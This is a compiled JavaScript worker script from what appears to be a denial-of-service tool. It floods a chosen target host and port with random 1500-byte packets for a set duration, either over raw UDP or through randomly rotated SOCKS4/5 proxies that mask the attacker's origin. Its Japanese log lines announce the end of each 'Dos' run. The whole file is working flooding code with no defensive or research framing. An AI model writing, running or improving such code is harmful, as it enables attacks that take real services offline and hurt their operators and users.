"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const worker_threads_1 = require("worker_threads");
const socks_1 = require("socks");
const dgram_1 = __importDefault(require("dgram"));
const crypto_1 = __importDefault(require("crypto"));
//import functions files
const sleep_1 = require("../util/sleep");
//colors
const red = '\u001b[31m';
const green = '\u001b[32m';
const yellow = '\u001b[33m';
const white = `\u001b[0m`;
//settings
const client = dgram_1.default.createSocket("udp4");
const packetContent = crypto_1.default.randomBytes(1500);
function layer4_worker(target_host, target_port, proxySelect, proxy_type_select, proxies, interval, time, currentThread) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            let dosInterval;
            if (proxySelect === "ON") {
                dosInterval = setInterval(() => __awaiter(this, void 0, void 0, function* () {
                    let [proxy_host, proxy_port] = proxies[Math.floor(Math.random() * proxies.length)].split(":");
                    try {
                        //options
                        const proxy_options = {
                            proxy: {
                                ipaddress: proxy_host,
                                port: Number(proxy_port),
                                type: proxy_type_select === 4 ? 4 : 5,
                            },
                            command: 'connect',
                            destination: {
                                host: target_host,
                                port: target_port,
                            },
                        };
                        const { socket } = yield socks_1.SocksClient.createConnection(proxy_options);
                        socket.on("error", (_) => {
                            console.error(`${red}x${white}Failed to connect to proxy ${proxy_host.trim()}:${proxy_port.trim()}`);
                        });
                        socket.write(packetContent, (err) => {
                            if (err) {
                                console.error(`${red}x${white}Failed to send packet to ${target_host}:${target_port} via proxy ${proxy_host}:${proxy_port}`);
                            }
                            else {
                                console.log(`${green}✓${white}${proxy_host.trim()}:${proxy_port.trim()} -> ${target_host}:${target_port}`);
                            }
                        });
                    }
                    catch (_) {
                        console.log(`${yellow}△${white} Connection as ${proxy_host.trim()}:${proxy_port.trim()} time out.`);
                    }
                }), interval);
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    clearInterval(dosInterval);
                    yield (0, sleep_1.sleep)(3000);
                    console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
                }), time * 1000);
            }
            else {
                dosInterval = setInterval(() => {
                    try {
                        client.send(packetContent, target_port, target_host, (err) => {
                            if (err) {
                                console.error(`${red}x${white} Failed to send packet to ${target_host}:${target_port}`);
                            }
                            else {
                                console.log(`${green}✓${white} Sent packet to ${target_host}:${target_port}`);
                            }
                        });
                    }
                    catch (err) {
                        console.log(`${yellow}△${white} Connection as proxy time out.`);
                    }
                }, interval);
                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                    clearInterval(dosInterval);
                    yield (0, sleep_1.sleep)(3000);
                    console.log(`Thread: ${currentThread} | ✓${time}秒間のDosが終了しました。`);
                }), time * 1000);
            }
        }
        catch (error) {
            console.error(`Unexpected error: ${error}`);
        }
    });
}
layer4_worker(worker_threads_1.workerData.target_host, worker_threads_1.workerData.target_port, worker_threads_1.workerData.proxySelect, worker_threads_1.workerData.proxy_type_select, worker_threads_1.workerData.proxies, worker_threads_1.workerData.interval, worker_threads_1.workerData.time, worker_threads_1.workerData.currentThread).catch((error) => {
    worker_threads_1.parentPort === null || worker_threads_1.parentPort === void 0 ? void 0 : worker_threads_1.parentPort.postMessage({ error: error.message });
});
